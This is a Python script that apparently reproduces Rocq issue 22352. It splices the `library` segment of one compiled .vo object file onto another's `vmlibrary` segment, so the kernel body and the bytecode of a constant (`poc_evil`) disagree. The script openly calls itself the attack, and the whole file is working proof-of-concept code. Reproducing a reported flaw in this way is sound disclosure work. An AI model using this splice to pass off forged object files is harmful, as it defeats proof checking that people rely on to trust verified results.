"""Splice one Rocq .vo's `library` segment onto another's `vmlibrary` segment.

rocq#22352.  Called by verify.ps1 as:

    python splice.py <library-donor.vo> <vmlibrary-donor.vo> <out.vo>

The two donors must be compilations of the same source differing only in one
constant's *value*, so that their `opaques` and `summary` segments are
byte-identical; otherwise the result is not a well-formed object file and the
exhibit measures nothing.  verify.ps1 asserts that identity before writing, and
this script re-asserts it.

Container layout is `lib/objFile.ml`: a `Coq!` magic, a version word, an offset
to the segment table, then the segment payloads, then the table itself — name,
position, length and an MD5 of the payload per entry.  All integers big-endian.
Adapted from the reproducer in the issue; the assertions and the CLI are ours.

No patched tool is involved anywhere in this exhibit.  Object files produced by
`rocq compile` are not affected — this script is the attack, and the finding is
what `rocqchk` says about its output.
"""

import hashlib
import struct
import sys

MAGIC = 0x436F7121  # "Coq!"


def parse(path):
    """Return (vo_version, {segment_name: payload_bytes})."""
    blob = open(path, "rb").read()
    if struct.unpack_from(">I", blob, 0)[0] != MAGIC:
        raise SystemExit(f"{path}: not a Rocq object file (bad magic)")
    version = struct.unpack_from(">I", blob, 4)[0]
    off = struct.unpack_from(">Q", blob, 8)[0]
    count = struct.unpack_from(">I", blob, off)[0]
    off += 4
    segments = {}
    for _ in range(count):
        name_len = struct.unpack_from(">I", blob, off)[0]
        off += 4
        name = blob[off:off + name_len].decode()
        off += name_len
        pos, length = struct.unpack_from(">QQ", blob, off)
        off += 16 + 16  # position, length, then the 16-byte MD5 we do not need
        segments[name] = blob[pos:pos + length]
    return version, segments


def write(path, version, segments):
    out = bytearray(struct.pack(">IIQ", MAGIC, version, 0))
    table = []
    for name in sorted(segments):
        payload = segments[name]
        pos = len(out)
        out += payload
        digest = hashlib.md5(payload).digest()
        out += digest
        table.append((name, pos, len(payload), digest))
    table_pos = len(out)
    out += struct.pack(">I", len(table))
    for name, pos, length, digest in table:
        raw = name.encode()
        out += struct.pack(">I", len(raw)) + raw + struct.pack(">QQ", pos, length) + digest
    struct.pack_into(">Q", out, 8, table_pos)
    open(path, "wb").write(out)


def main():
    if len(sys.argv) != 4:
        raise SystemExit(__doc__)
    lib_donor, vm_donor, out_path = sys.argv[1:4]

    version, lib = parse(lib_donor)
    vm_version, vm = parse(vm_donor)

    if version != vm_version:
        raise SystemExit(f"vo_version mismatch: {version} vs {vm_version}")
    for name in ("library", "vmlibrary", "opaques", "summary"):
        if name not in lib or name not in vm:
            raise SystemExit(f"missing segment {name!r}; got {sorted(lib)} / {sorted(vm)}")

    # The preconditions the exhibit depends on.  If either of the first two ever
    # stops holding, the two compilations no longer differ in the way the splice
    # needs and the result would be measuring something else.
    if lib["library"] == vm["library"]:
        raise SystemExit("the two donors have the same `library`; they must differ")
    if lib["vmlibrary"] == vm["vmlibrary"]:
        raise SystemExit("the two donors have the same `vmlibrary`; they must differ")
    if lib["opaques"] != vm["opaques"] or lib["summary"] != vm["summary"]:
        raise SystemExit("donors disagree on `opaques`/`summary`; splice would be malformed")

    write(out_path, version, {
        "library":   lib["library"],    # body:     poc_evil = true
        "vmlibrary": vm["vmlibrary"],   # bytecode: poc_evil = false
        "opaques":   lib["opaques"],
        "summary":   lib["summary"],
    })
    print(f"spliced vo_version={version} -> {out_path}")


if __name__ == "__main__":
    main()
